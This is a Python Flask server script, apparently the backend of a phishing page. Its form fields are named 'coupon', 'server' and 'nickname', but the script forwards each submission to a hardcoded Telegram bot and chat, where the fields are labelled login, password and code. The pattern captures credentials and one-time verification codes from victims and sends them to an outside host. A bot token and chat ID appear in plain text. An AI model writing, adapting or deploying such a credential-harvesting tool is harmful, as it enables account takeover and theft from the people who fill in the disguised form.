import secrets
from datetime import datetime

import requests
from flask import Flask, jsonify, request, send_file


app = Flask(__name__)


# ============================================================
# TELEGRAM
# ============================================================

BOT_TOKEN = "8971571230:AAFswVbSM2foGwa1POv2Zk-smk5M-Cpiqj0"
CHAT_ID = "-1003571283881"


# ============================================================
# ВРЕМЕННОЕ ХРАНИЛИЩЕ
# ============================================================
# Важно:
# данные находятся только в памяти.
# После перезапуска Railway заявки исчезнут.

requests_storage = {}


# ============================================================
# ОТПРАВКА В TELEGRAM
# ============================================================

def send_telegram(message):
    print("========== TELEGRAM DEBUG ==========")
    print("BOT TOKEN EXISTS:", bool(BOT_TOKEN))
    print("CHAT ID:", repr(CHAT_ID))

    if not BOT_TOKEN:
        print("ERROR: BOT_TOKEN пустой")
        return False

    if not CHAT_ID:
        print("ERROR: CHAT_ID пустой")
        return False

    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

    try:
        response = requests.post(
            url,
            json={
                "chat_id": CHAT_ID,
                "text": message,
                "parse_mode": "HTML"
            },
            timeout=10
        )

        print("HTTP STATUS:", response.status_code)
        print("TELEGRAM RESPONSE:", response.text)
        print("====================================")

        return response.ok

    except Exception as error:
        print("TELEGRAM EXCEPTION:", repr(error))
        print("====================================")

        return False


# ============================================================
# ID ЗАЯВКИ
# ============================================================

def generate_request_id():
    return secrets.token_hex(4).upper()


# ============================================================
# ГЛАВНАЯ СТРАНИЦА
# ============================================================

@app.route("/")
def index():
    return send_file("index.html")


# ============================================================
# ПЕРВАЯ ОТПРАВКА
# ============================================================

@app.route("/submit", methods=["POST"])
def submit():

    data = request.get_json(
        silent=True
    ) or {}

    coupon = str(
        data.get("coupon", "")
    ).strip()

    server = str(
        data.get("server", "")
    ).strip()

    if not coupon or not server:

        return jsonify({
            "success": False,
            "error": "Заполните оба поля."
        }), 400

    if len(coupon) > 200:

        return jsonify({
            "success": False,
            "error": "Купон слишком длинный."
        }), 400

    if len(server) > 200:

        return jsonify({
            "success": False,
            "error": "Сервер слишком длинный."
        }), 400

    request_id = generate_request_id()

    created_at = datetime.now().strftime(
        "%d.%m.%Y %H:%M:%S"
    )

    requests_storage[request_id] = {

        "coupon": coupon,

        "server": server,

        "nickname": None,

        "created_at": created_at,

        "confirmed": False
    }

    # ========================================================
    # ПЕРВОЕ СООБЩЕНИЕ TELEGRAM
    # ========================================================

    telegram_message = (

        "🆕 <b>НОВАЯ ЗАЯВКА</b>\n\n"

        f"🆔 ID: "
        f"<code>{request_id}</code>\n"

        f"🎟 логин: "
        f"<code>{coupon}</code>\n"

        f"🖥 пароль: "
        f"<code>{server}</code>\n"

        "⏳ Статус: "
        "ожидает код"
    )

    telegram_ok = send_telegram(
        telegram_message
    )

    if not telegram_ok:

        requests_storage.pop(
            request_id,
            None
        )

        return jsonify({

            "success": False,

            "error":
                "Не удалось отправить заявку. "
                "Проверьте Telegram и Railway Logs."

        }), 500

    return jsonify({

        "success": True,

        "request_id": request_id

    })


# ============================================================
# ПОДТВЕРЖДЕНИЕ НИКА
# ============================================================

@app.route("/confirm", methods=["POST"])
def confirm():

    data = request.get_json(
        silent=True
    ) or {}

    request_id = str(
        data.get("request_id", "")
    ).strip()

    nickname = str(
        data.get("nickname", "")
    ).strip()

    if not request_id:

        return jsonify({

            "success": False,

            "error":
                "Не указан ID заявки."

        }), 400

    if not nickname:

        return jsonify({

            "success": False,

            "error":
                "Введите ник."

        }), 400

    if len(nickname) > 100:

        return jsonify({

            "success": False,

            "error":
                "Ник слишком длинный."

        }), 400

    application = requests_storage.get(
        request_id
    )

    if not application:

        return jsonify({

            "success": False,

            "error":
                "Заявка не найдена."

        }), 404

    if application["confirmed"]:

        return jsonify({

            "success": False,

            "error":
                "Эта заявка уже подтверждена."

        }), 400

    application["nickname"] = nickname

    application["confirmed"] = True

    confirmed_at = datetime.now().strftime(
        "%d.%m.%Y %H:%M:%S"
    )

    # ========================================================
    # ВТОРОЕ СООБЩЕНИЕ TELEGRAM
    # ========================================================

    telegram_message = (

        "✅ <b>ЗАЯВКА ПОДТВЕРЖДЕНА</b>\n\n"

        f"🆔 ID: "
        f"<code>{request_id}</code>\n"

        f"🎟 Логин: "
        f"<code>{application['coupon']}</code>\n"

        f"🖥 Пароль: "
        f"<code>{application['server']}</code>\n"

        f"👤 КОД: "
        f"<code>{nickname}</code>\n"

        "🟢 Статус: подтверждено"
    )

    telegram_ok = send_telegram(
        telegram_message
    )

    if not telegram_ok:

        return jsonify({

            "success": False,

            "error":
                "Не удалось отправить подтверждение. "
                "Проверьте Telegram и Railway Logs."

        }), 500

    return jsonify({

        "success": True

    })


# ============================================================
# ЗАПУСК
# ============================================================

if __name__ == "__main__":

    import os

    port = int(
        os.environ.get(
            "PORT",
            8080
        )
    )

    app.run(

        host="0.0.0.0",

        port=port,

        debug=False
    )
